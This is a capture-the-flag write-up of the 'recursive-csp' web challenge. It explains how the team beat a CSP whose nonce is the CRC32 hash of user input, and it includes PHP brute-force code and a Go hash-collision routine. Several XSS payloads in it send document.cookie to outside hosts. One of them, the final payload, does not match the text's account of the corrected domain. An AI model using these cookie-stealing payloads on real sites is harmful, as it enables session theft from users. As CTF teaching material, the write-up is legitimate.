# Recursive-csp

## Description

the nonce isn't random, so how hard could this be?

(the flag is in the admin bot's cookie)

- **Author** : strellic
- **Category** : Web
- **Points** : 115
- **Solves** : 178

## Solution

### Understanding the challenge

Here we get the source for `\?source` 

```php
<?php
  if (isset($_GET["source"])) highlight_file(__FILE__) && die();

  $name = "world";
  if (isset($_GET["name"]) && is_string($_GET["name"]) && strlen($_GET["name"]) < 128) {
    $name = $_GET["name"];
  }

  $nonce = hash("crc32b", $name);
  header("Content-Security-Policy: default-src 'none'; script-src 'nonce-$nonce' 'unsafe-inline'; base-uri 'none';");
?>
<!DOCTYPE html>
<html>
  <head>
    <title>recursive-csp</title>
  </head>
  <body>
    <h1>Hello, <?php echo $name ?>!</h1>
    <h3>Enter your name:</h3>
    <form method="GET">
      <input type="text" placeholder="name" name="name" />
      <input type="submit" />
    </form>
    <!-- /?source -->
  </body>
</html>
```

It's a simple XSS Challenge in PHP. The catch is that there is a [nonce](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/nonce) that prevents us from getting XSS directly and the nonce is basically the [crc32](https://www.php.net/manual/en/function.crc32.php) hash of our payload. But our payload must contain the [nonce](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/nonce)

Basically `We should have the crc32 hash of the WHOLE MESSAGE inside the MESSAGE`

### Trying the Bruteforce

For a while, we were trying to brute force the nonce, hoping it will be the same at least one time since the crc32 has only 8 bytes.

```php
<?php
for ($i = 0; $i <= 0xffffffff; $i++) {
  $x=sprintf("%08x", $i);
  $y='<script nonce="'.$x.'">window.location="https://webhook.site/a0a221c5-6a61-4ff6-a1f5-438ed5ce9403/?x="+document.cookie</script>';
  echo $y;

  $z=hash("crc32b", $y);

  if($z===$x){
    echo "found";
    exit();
  }

  echo "\n";
}
?>
```

But this never worked out :cry: 

We tried this so for so long and while it was running we searched for other ways.

### Trying the collider

So we searched for `crc32` collissions and got [this](https://github.com/fyxme/crc-32-hash-collider)

```go
func AddLetter(c chan string, combo string, alphabet string, length int) {
	// Check if we reached the length limit
	// If so, we just return without adding anything
	if length <= 0 {
		return
	}

	var newCombo string
	for _, ch := range alphabet {
		newCombo = combo + string(ch)
		c <- newCombo
		AddLetter(c, newCombo, alphabet, length-1)
	}
}

func worker(wChan chan string, target uint32) {
	for tString := range wChan {
		if crc32.ChecksumIEEE([]byte(tString)) == target {
			fmt.Println("Collision found:", tString)
		}
	}
}
```

This is just a crc32 hash collider written in go. It will start with a String and append as many characters as `maxLen` would allow and try if the hash matches. So all that was left was for us to decide on a nonce and give its corresponding integer as the `target` in the code.

**Note: Here we had to use a domain as the payload can only contain 127 characters and if we use webhook url we won't have enough charcters left to bruteforce**

By running the code on 16 different laptops with 16 cores with 16 different nonces, we were able to collide it just in time.

`<script nonce="e6377dcb">window.location="http://asol.space?x="+document.cookie</script>000000000000000000000000000000000048io`

But we made one mistake in the domain to which the flag is sent. Where the domain was supposed to be `https://axol.space` I put `https://asol.space` :sob:

Now we had to put the correct domain and hash it again. This time it took even longer. It took so much time that we were just going to buy `https://asol.space`. But we collided that payload too and finally got the flag

`<script nonce="e6377dcb">window.location="http://asol.space?x="+document.cookie</script>0000000000hytza`

**Flag**: `dice{h0pe_that_d1dnt_take_too_l0ng}`